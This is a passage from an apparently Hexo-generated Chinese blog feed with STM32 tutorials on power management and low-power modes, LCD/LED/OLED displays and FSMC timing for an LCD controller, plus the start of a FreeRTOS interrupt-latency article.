    <content type="html"><![CDATA[<p>STM32系列的MCU都有电源管理功能，本文将介绍stm32系列MCU的电源管理系统。</p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在stm32中主要通过引脚<code>VDD</code>来从外部获取电源，在stm32内部有电源监控器用于检测<code>VDD</code>引脚的电压，以实现复位功能和掉电紧急处理功能。</p><h1 id="电源监控器"><a href="#电源监控器" class="headerlink" title="电源监控器"></a>电源监控器</h1><p>stm32通过这个物理结构来监视电源的情况。</p><h2 id="上电复位状态和掉电复位状态"><a href="#上电复位状态和掉电复位状态" class="headerlink" title="上电复位状态和掉电复位状态"></a>上电复位状态和掉电复位状态</h2><p>当检测到VDD的电压低于阈值VPOR及VPDR时，无需外部电路辅助，STM32芯片会自动保持在复位状态，防止因电压不足强行工作而带来严重的后果。 见图 POR与PDR ，在刚开始电压低于VPOR时(约1.92V)， STM32保持在<strong>上电复位状态</strong>(POR，Power On Reset)，当VDD电压持续上升至大于VPOR时，芯片开始正常运行，而在芯片正常运行的时候， 当检测到VDD电压下降至低于VPDR阈值(约1.88V)，会进入<strong>掉电复位状态</strong>(PDR，Power Down Reset)。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401310159780.png"></p><h2 id="可编程电压检测器PVD"><a href="#可编程电压检测器PVD" class="headerlink" title="可编程电压检测器PVD"></a>可编程电压检测器PVD</h2><p>上述POR、PDR功能是使用其电压阈值与外部供电电压VDD比较，当低于工作阈值时，会直接进入复位状态，这可防止电压不足导致的误操作。 除此之外，STM32还提供了可编程电压检测器PVD，它也是实时检测VDD的电压，当检测到电压低于编程的VPVD阈值时， 会向内核产生一个PVD中断(EXTI16线中断)以使内核在复位前进行紧急处理。该电压阈值可通过电源控制寄存器PWR_CSR设置。</p><p>其作用就是动态检测VDD，当VDD的值不在设置的范围内时就会产生一个内核中断，并且进入中断处理函数</p><h3 id="可编程电压检测器PVD的编程"><a href="#可编程电压检测器PVD的编程" class="headerlink" title="可编程电压检测器PVD的编程"></a>可编程电压检测器PVD的编程</h3><p>直接使用函数<code>PWR_PVDLevelConfig()</code>设置等级，参数可选项如下：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs txt">@arg PWR_PVDLevel_2V2: PVD detection level set to 2.2V<br>@arg PWR_PVDLevel_2V3: PVD detection level set to 2.3V<br>@arg PWR_PVDLevel_2V4: PVD detection level set to 2.4V<br>@arg PWR_PVDLevel_2V5: PVD detection level set to 2.5V<br>@arg PWR_PVDLevel_2V6: PVD detection level set to 2.6V<br>@arg PWR_PVDLevel_2V7: PVD detection level set to 2.7V<br>@arg PWR_PVDLevel_2V8: PVD detection level set to 2.8V<br>@arg PWR_PVDLevel_2V9: PVD detection level set to 2.9V<br></code></pre></td></tr></table></figure><p>如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-comment">/* 配置PVD级别PWR_PVDLevel_2V6 (PVD检测电压的阈值为2.6V，VDD电压低于2.6V时产生PVD中断) */</span><br><span class="hljs-comment">/*具体级别根据自己的实际应用要求配置*/</span><br> PWR_PVDLevelConfig(PWR_PVDLevel_2V6);<br></code></pre></td></tr></table></figure><h1 id="stm32中的电源管理系统"><a href="#stm32中的电源管理系统" class="headerlink" title="stm32中的电源管理系统"></a>stm32中的电源管理系统</h1><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401312120462.png"></p><p>从上图我们知道smt32中的电源管理主要是三个部分：</p><ul><li>ADC电源及参考电压（VDDA供电区域）</li><li>调压器供电电路（VDD&#x2F;1.8V供电区域）</li><li>备份域电路（后备供电区域）</li></ul><h2 id="ADC电源"><a href="#ADC电源" class="headerlink" title="ADC电源"></a>ADC电源</h2><p>上图中的VDDA供电区域。为了提高转换精度，STM32的ADC配有独立的电源接口，方便进行单独的滤波。 ADC的工作电源使用VDDA引脚输入，使用VSSA作为独立的地连接， VREF引脚则为ADC提供测量使用的参考电压。</p><h2 id="调压器电路"><a href="#调压器电路" class="headerlink" title="调压器电路"></a>调压器电路</h2><p>调在STM32的电源系统中调压器供电的电路是最主要的部分，调压器为备份域及待机电路以外的所有数字电路供电。</p><p>由于这个电压是<code>1.8V</code>所以这个区域也称之为<strong>1.8V供电区域</strong></p><p>调压器可以运行在“运行模式”、“停止模式”以及“待机模式”。</p><ul><li>在运行模式下，1.8V域全功率运行；</li><li>在停止模式下1.8V域运行在低功耗状态， 1.8V区域的所有时钟都被关闭，相应的外设都停止了工作，但它会保留内核寄存器以及SRAM的内容；</li><li>在待机模式下，整个1.8V域都断电， 该区域的内核寄存器及SRAM内容都会丢失(备份区域的寄存器不受影响)。</li></ul><h2 id="备份域电路"><a href="#备份域电路" class="headerlink" title="备份域电路"></a>备份域电路</h2><p><strong>STM32的LSE振荡器、<code>RTC</code>及备份寄存器这些器件被包含进备份域电路中</strong>，这 部分的电路可以通过STM32的VBAT引脚获取供电电源， <strong>在实际应用中一般会使用3V的钮扣电池对该引脚供电。</strong></p><h1 id="stm32中的功耗模式"><a href="#stm32中的功耗模式" class="headerlink" title="stm32中的功耗模式"></a>stm32中的功耗模式</h1><p>按功耗由高到低排列，STM32具有运行、睡眠、停止和待机四种工作模式。上电复位后STM32处于运行状态时，当内核不需要继续运行， 就可以选择进入后面的三种低功耗模式降低功耗，这三种模式中，电源消耗不同、唤醒时间不同、唤醒源不同，用户需要根据应用需求， 选择最佳的低功耗模式。</p><h2 id="睡眠模式"><a href="#睡眠模式" class="headerlink" title="睡眠模式"></a>睡眠模式</h2><p>这个模式下会关闭内核时钟，但是外设会正常运行。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401312122804.png"></p><h3 id="睡眠模式相关编程"><a href="#睡眠模式相关编程" class="headerlink" title="睡眠模式相关编程"></a>睡眠模式相关编程</h3><p>我们知道在睡眠模式中，直接使用编译器指令<code>WFI</code>、<code>WFE</code>就可以直接进入睡眠模式，但是其他两个模式不可以。</p><p>代码示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)<br>  &#123;<br><span class="hljs-comment">/*********执行任务***************************/</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\r\n STM32正常运行，亮绿灯\r\n&quot;</span>);<br><br>LED_GREEN;<br>Delay(<span class="hljs-number">0x3FFFFF</span>);<br><br><span class="hljs-comment">/*****任务执行完毕，进入睡眠降低功耗***********/</span><br><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\r\n 进入睡眠模式，按KEY1或KEY2按键可唤醒\r\n&quot;</span>);<br><br><span class="hljs-comment">//使用红灯指示，进入睡眠状态</span><br>LED_RED;<br><span class="hljs-comment">//进入睡眠模式</span><br>__WFI();<span class="hljs-comment">//WFI指令进入睡眠</span><br><br><span class="hljs-comment">//等待中断唤醒  K1或K2按键中断</span><br><br><span class="hljs-comment">/***被唤醒，亮蓝灯指示***/</span><br>LED_BLUE;<br>Delay(<span class="hljs-number">0x1FFFFF</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\r\n 已退出睡眠模式\r\n&quot;</span>);<br><span class="hljs-comment">//继续执行while循环</span><br><br>  &#125;<br></code></pre></td></tr></table></figure><p>进入模式就是函数<code>__WFI()</code>或者是<code>__WFE()</code></p><p>退出模式就是中断或者是时间，决定于进入模式时使用的函数</p><h2 id="停止模式"><a href="#停止模式" class="headerlink" title="停止模式"></a>停止模式</h2><p>这个模式下会关闭所有的时钟，但是内核、备份域中的寄存器中的值仍然会被保存下来。<strong>所以从停止模式退出来之后可以继续执行后面的代码。</strong></p><p>停止模式可以由任意一个外部中断(EXTI)唤醒，在停止模式中可以选择电压调节器为开模式或低功耗模式。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401312124013.png"></p><p>注意点：</p><ul><li>在这个模式下，当退出状态的时候HSI会被自动选择为系统时钟。所以我们需要自己调回至HSE。在上图中的唤醒延迟中有写道</li></ul><h3 id="停止模式相关编程"><a href="#停止模式相关编程" class="headerlink" title="停止模式相关编程"></a>停止模式相关编程</h3><p>编程实例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)<br>&#123;<br><span class="hljs-comment">/*********执行任务***************************/</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\r\n STM32正常运行，亮绿灯\r\n&quot;</span>);<br><br>LED_GREEN;<br>Delay(<span class="hljs-number">0x3FFFFF</span>);<br><br><span class="hljs-comment">/*****任务执行完毕，进入停止降低功耗***********/</span><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\r\n 进入停止模式，按KEY1或KEY2按键可唤醒\r\n&quot;</span>);<br><br><span class="hljs-comment">//使用红灯指示，进入停止状态</span><br>LED_RED;<br><br><span class="hljs-comment">/* 进入停止模式，设置电压调节器为低功耗模式，等待中断唤醒 */</span><br>PWR_EnterSTOPMode(PWR_Regulator_LowPower,PWR_STOPEntry_WFI);<br><br><br><span class="hljs-comment">//等待中断唤醒  K1或K2按键中断</span><br><br><span class="hljs-comment">/*********************被唤醒***********************/</span><br><br><span class="hljs-comment">//获取刚被唤醒时的时钟状态</span><br><span class="hljs-comment">//时钟源</span><br>clock_source_wakeup = RCC_GetSYSCLKSource ();<br><span class="hljs-comment">//时钟频率</span><br>RCC_GetClocksFreq(&amp;clock_status_wakeup);<br><br><span class="hljs-comment">//从停止模式下被唤醒后使用的是HSI时钟，此处重启HSE时钟,使用PLLCLK</span><br>SYSCLKConfig_STOP();<br><br><span class="hljs-comment">//获取重新配置后的时钟状态</span><br><span class="hljs-comment">//时钟源</span><br>clock_source_config = RCC_GetSYSCLKSource ();<br><span class="hljs-comment">//时钟频率</span><br>RCC_GetClocksFreq(&amp;clock_status_config);<br><br><span class="hljs-comment">//因为刚唤醒的时候使用的是HSI时钟，会影响串口波特率，输出不对，所以在重新配置时钟源后才使用串口输出。</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\r\n重新配置后的时钟状态：\r\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; SYSCLK频率:%d,\r\n HCLK频率:%d,\r\n PCLK1频率:%d,\r\n PCLK2频率:%d,\r\n 时钟源:%d (0表示HSI，8表示PLLCLK)\n&quot;</span>, <br>clock_status_config.SYSCLK_Frequency, <br>clock_status_config.HCLK_Frequency, <br>clock_status_config.PCLK1_Frequency, <br>clock_status_config.PCLK2_Frequency, <br>clock_source_config);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\r\n刚唤醒的时钟状态：\r\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; SYSCLK频率:%d,\r\n HCLK频率:%d,\r\n PCLK1频率:%d,\r\n PCLK2频率:%d,\r\n 时钟源:%d (0表示HSI，8表示PLLCLK)\n&quot;</span>, <br>clock_status_wakeup.SYSCLK_Frequency, <br>clock_status_wakeup.HCLK_Frequency, <br>clock_status_wakeup.PCLK1_Frequency, <br>clock_status_wakeup.PCLK2_Frequency, <br>clock_source_wakeup);<br><br><span class="hljs-comment">/*指示灯*/</span><br>LED_BLUE;<br>Delay(<span class="hljs-number">0x1FFFFF</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\r\n 已退出停止模式\r\n&quot;</span>);<br><span class="hljs-comment">//继续执行while循环</span><br><br>&#125;<br></code></pre></td></tr></table></figure><p>编程注意点：</p><ul><li>直接使用函数<code>PWR_EnterSTOPMode(PWR_Regulator_LowPower,PWR_STOPEntry_WFI)</code>进入停止模式，不需要提前的配置。<ul><li><code>PWR_Regulator_LowPower</code>作用是设置电压调节器为低功耗模式</li><li><code>PWR_STOPEntry_WFI</code>作用时依靠中断来退出模式</li></ul></li><li>每次唤醒之后需要重新设置好系统时钟</li></ul><h2 id="待机模式"><a href="#待机模式" class="headerlink" title="待机模式"></a>待机模式</h2><p>这个模式下关闭所有的外设、时钟，还把1.8V区域的电源也完全关闭了。但是如果备份域的电源还有电的话，备份域内的RTC都可以正常运行，备份域内的寄存器的数据会被保存，不受功耗模式影响。<strong>所以从这个模式下退出时，就相当于复位，程序会从头开始执行。</strong></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401312125760.png"></p><p>注意点：</p><ul><li>待机模式下可以使用<code>WKUP</code>引脚来退出模式，但前提是需要使用函数<code>PWR_WakeUpPinCmd (ENABLE);</code>使能<code>WKUP</code>引脚。</li></ul><h3 id="待机模式相关编程"><a href="#待机模式相关编程" class="headerlink" title="待机模式相关编程"></a>待机模式相关编程</h3><p>代码示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//检测复位来源</span><br><span class="hljs-keyword">if</span>(PWR_GetFlagStatus(PWR_FLAG_WU) == SET)<br>&#123;<br>LED_BLUE;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\r\n 待机唤醒复位 \r\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>LED_GREEN;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\r\n 非待机唤醒复位 \r\n&quot;</span>);<br>&#125;<br><br> <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)<br> &#123;<br><span class="hljs-comment">// K2 按键长按进入待机模式</span><br><span class="hljs-keyword">if</span>(KEY2_LongPress())<br>&#123;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\r\n 即将进入待机模式，进入待机模式后可按KEY1唤醒，唤醒后会进行复位，程序从头开始执行\r\n&quot;</span>);<br>LED_RED;<br>Delay(<span class="hljs-number">0xFFFF</span>);<br><br><span class="hljs-comment">/*清除WU状态位*/</span><br>PWR_ClearFlag (PWR_FLAG_WU);<br><br><span class="hljs-comment">/* 使能WKUP引脚的唤醒功能 ，使能PA0*/</span><br>PWR_WakeUpPinCmd (ENABLE);<br><br><span class="hljs-comment">/* 进入待机模式 */</span><br>PWR_EnterSTANDBYMode();<br>&#125;<br><br> &#125;<br></code></pre></td></tr></table></figure><p>编程步骤：</p><ul><li>最开始时需要检测复位来源通过<code>PWR_GetFlagStatus()</code>函数。</li><li>在进入模式之前需要完成好相关的配置<ul><li>清除WU状态位，其作用是其必须被设置为0才可以进入待机模式</li><li>使能WKUP引脚的唤醒功能，这个引脚的功能是其必须上升，才可以退出模式</li></ul></li><li>最后使用函数<code>PWR_EnterSTANDBYMode()</code>进入待机模式</li></ul><h1 id="编程总结"><a href="#编程总结" class="headerlink" title="编程总结"></a>编程总结</h1><p>函数：</p><p><code>PWR_ClearFlag()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">PWR_ClearFlag</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> PWR_FLAG)</span><br><br><span class="hljs-comment">//PWR_FLAG_WU: Wake Up flag，唤醒标致</span><br><span class="hljs-comment">//PWR_FLAG_SB: StandBy flag，待机标致</span><br><span class="hljs-comment">//这些都在定义的函数中的注释中有说明</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>stm32</category>
      
      <category>电源管理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>stm32中的实时时钟</title>
    <link href="/2024/01/29/stm32%E4%B8%AD%E7%9A%84%E5%AE%9E%E6%97%B6%E6%97%B6%E9%92%9F/"/>
    <url>/2024/01/29/stm32%E4%B8%AD%E7%9A%84%E5%AE%9E%E6%97%B6%E6%97%B6%E9%92%9F/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>stm32和液晶显示</title>
    <link href="/2024/01/25/stm32%E5%92%8C%E6%B6%B2%E6%99%B6%E6%98%BE%E7%A4%BA/"/>
    <url>/2024/01/25/stm32%E5%92%8C%E6%B6%B2%E6%99%B6%E6%98%BE%E7%A4%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>面我们主要区分<code>led</code>和<code>oled</code>、<code>lcd</code>三种显示器，并且说明它们的工作原理。</p><h2 id="液晶显示器"><a href="#液晶显示器" class="headerlink" title="液晶显示器"></a>液晶显示器</h2><p>液晶显示器（LCD），相对于上一代CRT显示器(阴极射线管显示器)，LCD显示器具有功耗低、体积小、 承载的信息量大及不伤眼的优点，因而它成为了现在的主流电子显示设备，其中包括电视、电脑显示器、手机屏幕及各种嵌入式设备的显示器。 图 液晶电视及CRT电视 是液晶电视与CRT电视的外观对比，很明显液晶电视更薄，“时尚”是液晶电视给人的第一印象，而CRT 电视则感觉很“笨重”。</p><h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><p>液晶是一种介于固体和液体之间的特殊物质，它是一种有机化合物，常态下呈液态，但是它的分子排列却和固体晶体一样非常规则，因此取名液晶。如果给液晶施加电场，会改变它的分子排列，从而改变光线的传播方向，配合偏振光片，它就具有控制光线透过率的作用，再配合彩色滤光片， 改变加给液晶电压大小，就能改变某一颜色透光量的多少</p><p>注意液晶本身是不发光的，所以需要有一个背光灯提供光源，光线经过一系列处理过程才到输出，所以输出的光线强度是要比光源的强度低很多的， 比较浪费能源(当然，比CRT显示器还是节能多了)。</p><h3 id="液晶的优缺点"><a href="#液晶的优缺点" class="headerlink" title="液晶的优缺点"></a>液晶的优缺点</h3><p>优点：</p><ul><li>相较于CRT显示器具有耗能低，体积小，不伤眼的好处</li></ul><p>缺点：</p><ul><li>从侧面看不清，</li><li>色彩较多的画面时，转换的速度慢</li></ul><h2 id="LED"><a href="#LED" class="headerlink" title="LED"></a>LED</h2><p>相较于上一代的液晶显示器，led显示器有如下优点</p><ul><li>色彩更加丰富</li><li>响应速度更快</li><li>能耗更低</li></ul><p>但是其也有缺点：</p><ul><li>相较于下一代oled显示器，其体积过大，一般使用在广场、广告牌上</li><li>相较于oled，其色彩单一。</li></ul><h3 id="工作原理-1"><a href="#工作原理-1" class="headerlink" title="工作原理"></a>工作原理</h3><p>LED点阵显示器不存在以上液晶显示器的问题，LED点阵彩色显示器的单个像素点内包含红绿蓝三色LED灯，显示原理类似我们实验板上的LED彩灯， 通过控制红绿蓝颜色的强度进行混色，实现全彩颜色输出，多个像素点构成一个屏幕。</p><h2 id="OLED"><a href="#OLED" class="headerlink" title="OLED"></a>OLED</h2><p>新一代的OLED显示器与LED点阵彩色显示器的原理类似， 但由于它采用的像素单元是“有机发光二极管”(Organic Light Emitting Diode)， 所以像素密度比普通LED点阵显示器高得多</p><p><strong>OLED显示器不需要背光源、对比度高、轻薄、视角广及响应速度快等优点。</strong>待到生产工艺更加成熟时， 必将取代现在液晶显示器的地位。</p><h2 id="显示面板的接口"><a href="#显示面板的接口" class="headerlink" title="显示面板的接口"></a>显示面板的接口</h2><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403171659904.png"></p><p>从上图中可以看到，一些显示面板中会出现有一些黄色的接口线。这些线被称之为：FFC，flexible flat cable，柔性扁平电缆。如果看实物，跟FPC比较像。但它仅仅是电缆，或者可以称为排线，铜线被压制在绝缘材料内。比一般的铜线密度更大。</p><p>FPC：英文全拼Flexible Printed Circuit ，其中文意思是柔性印制线路板，简称软板。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403171701032.png"></p><p><strong>与之相对应的就是PCB（又称为硬板）PCB：英文全拼Printed Circuit Board，其中文意思是钢性印制线路板，简称硬板；</strong></p><p>FFC(Flexible Flat Cable)柔性扁平电缆是一种用PET绝缘材料和极薄的镀锡扁平铜线，通过高科技自动化设备生产线压合而成的新型数据线缆，具有柔软、随意弯曲折叠、厚度薄、体积小、连接简单、拆卸方便、易解决电磁屏蔽(EMI)等优点。 FPC（Flexible Printed Circuit board翻译成中文就是：柔性印刷电路板，通俗讲就是用软性材料（可以折叠、弯曲的材料）做成的PCB）连接器用于LCD显示屏到驱动电路(PCB)的连接，目前以0.5mm pitch产品为主，0.3mm pitch产品也已大量使用。</p><p><strong>用来连接上述类型的连接器被称之为FFC&#x2F;FPC连接器</strong>，形状如下所示：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403172227396.png"></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403172227179.png"></p><p>一般的显示模块都是使用两种连接器：</p><ul><li>一个就是上述的FFC&#x2F;FPC连接器</li><li>第二个就是一般的插座</li></ul><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403172229005.png"></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202403172231696.png"></p><h3 id="二者的主要区别"><a href="#二者的主要区别" class="headerlink" title="二者的主要区别"></a>二者的主要区别</h3><ol><li>制造方式的不同：<ul><li>FPC 是用化学蚀刻的方式把FCCL（柔性覆铜箔）处理得到线路走型不同单面双面以及多层结构的柔性线路板。</li><li>FFC是用上下两层绝缘箔膜中间夹上扁平铜箔，成品较简单，厚度较厚。</li></ul></li><li>价格不同，FFC的价格一般要低于FPC的价格</li></ol><h1 id="stm32和液晶显示器的共同使用"><a href="#stm32和液晶显示器的共同使用" class="headerlink" title="stm32和液晶显示器的共同使用"></a>stm32和液晶显示器的共同使用</h1><p>实际上市面上的液晶显示器都需要芯片来进行管理和控制。在野火平台上则是使用<code>ILI9806G</code>液晶控制器来进行控制。我们通过控制stm32和液晶控制器进行通信来达到控制显示器的目的。</p><p><code>ILI9806G</code>在这个液晶控制器中, 默认使用8080时序来通信, stm32可以通过FSMC中的不同的模式来模仿8080时序，以达到通信的目的。</p><h1 id="编程相关"><a href="#编程相关" class="headerlink" title="编程相关"></a>编程相关</h1><p>首先我们需要通过<strong>FSMC</strong>来模仿<code>ILI9806G</code>芯片的时序。stm32中的FSMC时序结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">uint32_t</span> FSMC_AddressSetupTime;       <span class="hljs-comment">/*地址建立时间，0-0xF个HCLK周期*/</span><br><span class="hljs-type">uint32_t</span> FSMC_AddressHoldTime;        <span class="hljs-comment">/*地址保持时间，0-0xF个HCLK周期*/</span><br><span class="hljs-type">uint32_t</span> FSMC_DataSetupTime;           <span class="hljs-comment">/*地址建立时间，0-0xF个HCLK周期*/</span><br><span class="hljs-type">uint32_t</span> FSMC_BusTurnAroundDuration;<span class="hljs-comment">/*总线转换周期,0-0xF个HCLK周期，在NOR FLASH */</span><br><span class="hljs-type">uint32_t</span> FSMC_CLKDivision;<span class="hljs-comment">/*时钟分频因子,1-0xF，若控制异步存储器，本参数无效 */</span><br><span class="hljs-type">uint32_t</span> FSMC_DataLatency;    <span class="hljs-comment">/*数据延迟时间，若控制异步存储器，本参数无效 */</span><br><span class="hljs-type">uint32_t</span> FSMC_AccessMode;             <span class="hljs-comment">/*设置访问模式 */</span><br>&#125;FSMC_NORSRAMTimingInitTypeDef;<br></code></pre></td></tr></table></figure><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401260031849.png"><br>通过对比FSMC的B模式和8080时序图，可以发现B模式和8080非常相似。一次通过这个模式来模仿8080通信。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401260031361.png"></p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="http://www.pinhui.wang/73981.shtml">http://www.pinhui.wang/73981.shtml</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>FreeRTOS-8-中断管理</title>
    <link href="/2024/01/25/FreeRTOS-8-%E4%B8%AD%E6%96%AD%E7%AE%A1%E7%90%86/"/>
    <url>/2024/01/25/FreeRTOS-8-%E4%B8%AD%E6%96%AD%E7%AE%A1%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="中断延迟"><a href="#中断延迟" class="headerlink" title="中断延迟"></a>中断延迟</h1><p>即使操作系统的响应很快了，对于中断的处理也存在中断延迟响应的问题，我们称之为中断延迟（interrupt latency）。中断延迟是指从硬件中断发生到开始执行中断处理程序第一条指令的这段时间。也就是系统接收到中断信号到操作系统做出响应，并完成转入中断服务程序的时间。</p><p><strong>中断延迟&#x3D;识别中断时间+［等待中断打开时间］+［关闭中断时间］</strong></p><p>注意：“[]”的时间是不一定都存在的，此处为最大可能的中断延迟时间。</p><h2 id="识别中断时间"><a href="#识别中断时间" class="headerlink" title="识别中断时间"></a>识别中断时间</h2><p>中断的处理过程是，外界硬件发生中断后，CPU到中断处理器读取中断向量，并且查找中断向量表，找到对应的中断服务子程序（ISR）的首地址，然后跳转到对应的ISR去做相应处理。这部分时间可称为识别中断时间。</p><h2 id="等待中断打开时间"><a href="#等待中断打开时间" class="headerlink" title="等待中断打开时间"></a>等待中断打开时间</h2><p>在允许中断嵌套的实时操作系统中，中断也是基于优先级的，允许高优先级中断抢断正在处理的低优先级中断，所以，如果当前正在处理更高优先级的中断，即使此时有低优先级的中断，系统也不会立刻响应，而是等到高优先级的中断处理完之后才会响应。在不支持中断嵌套的情况下，即中断是没有优先级的，不允许打断，如果当前系统正在处理一个中断，而此时另一个中断到来了，系统是不会立即响应的，而是等处理完当前的中断之后，才会处理后来的中断。此部分时间可称为等待中断打开时间。</p><h2 id="关闭中断时间"><a href="#关闭中断时间" class="headerlink" title="关闭中断时间"></a>关闭中断时间</h2><p>在操作系统中，很多时候我们会主动进入临界段，系统不允许当前状态被中断打断，所以在临界区发生的中断会被挂起，直到退出临界段时才打开中断。此部分时间，可称为关闭中断时间。</p><h1 id="ARM-Cortex-M的中断管理"><a href="#ARM-Cortex-M的中断管理" class="headerlink" title="ARM Cortex-M的中断管理"></a>ARM 